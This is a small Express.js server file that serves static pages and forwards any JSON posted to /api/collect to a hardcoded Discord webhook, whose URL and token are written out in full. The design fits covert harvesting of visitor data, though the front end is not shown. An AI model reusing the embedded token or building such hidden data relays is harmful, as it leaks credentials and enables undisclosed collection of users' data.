const express = require('express');
const path = require('path');
const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.static('public')); // serves HTML and static files

// Your Discord webhook (hidden on server side)
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1500446845753884733/lle6dhwxxJo86FaN1QdluMVkI0gjnfeRAcJY4BIYWFiUzCj4zciO3ArpeTnmbhIf2LDy';

// Endpoint that receives data from frontend
app.post('/api/collect', async (req, res) => {
    try {
        const payload = req.body;
        // Forward to Discord
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        res.status(200).json({ status: 'sent' });
    } catch (error) {
        console.error('Error forwarding to Discord:', error);
        res.status(500).json({ error: error.message });
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});